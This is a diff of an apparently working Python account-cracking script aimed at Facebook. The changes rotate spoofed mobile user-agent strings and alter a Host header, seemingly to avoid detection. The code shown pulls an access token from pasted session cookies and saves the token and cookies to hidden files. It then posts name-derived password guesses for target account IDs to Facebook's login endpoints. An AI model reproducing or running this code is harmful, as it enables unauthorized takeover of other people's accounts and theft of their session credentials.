@@ -26,8 +26,8 @@ for xd in range(10000):
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
         l='Mobile Safari/537.36'
-        uaku2=f'Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/312.0.0.10.103;]'
-        ugen.append('Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/312.0.0.10.103;]')
+        uaku2=f'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
+        ugen.append('Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36')
 for agent in range(10000):
         aa='Mozilla/5.0 (Linux; Android 6.0.1;'
         b=random.choice(['6','7','8','9','10','11','12'])
@@ -41,8 +41,8 @@ for agent in range(10000):
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
         l='Mobile Safari/533.1'
-        fullagnt=(f'Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/312.0.0.10.103;]')
-        ugen.append('Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/312.0.0.10.103;]')
+        fullagnt=(f'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36')
+        ugen.append('Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36')
 
 logo=("""\033[1;37m
 \033[1;34m ZZZZZZZZZZ       ZZZ         ZZZZ\033[1;34m
@@ -76,7 +76,7 @@ def login():
         clear()
         cookies = input(' Put cookies: ')
         try:
-                data = requests.get("m.facebook.com", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "en-GB,en-US;q=0.9,en;q=0.8","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
+                data = requests.get("m.facebook.com", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "en-GB,en-US;q=0.9,en;q=0.8","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                 find_token = re.search("(EAAG\w+)", data.text)
                 open(".tok.txt", "w").write(find_token.group(1))
                 open(".coki.txt","w").write(cookies)
@@ -459,7 +459,7 @@ def ffb(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not?A_Brand";v="24", "Chromium";v="108", "Google Chrome";v="108"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/312.0.0.10.103;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
+                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not?A_Brand";v="24", "Chromium";v="108", "Google Chrome";v="108"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
@@ -502,7 +502,7 @@ def api(ids,names,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/312.0.0.10.103;]'
+                                ua_string = f'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
@@ -572,7 +572,7 @@ def api1(ids,names,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/312.0.0.10.103;]'
+                                ua_string = f'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
@@ -639,7 +639,7 @@ def rndm(ids,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'Mozilla/5.0 (Linux; Android 10; RMX2020 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/312.0.0.10.103;]'
+                                ua_string = f'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
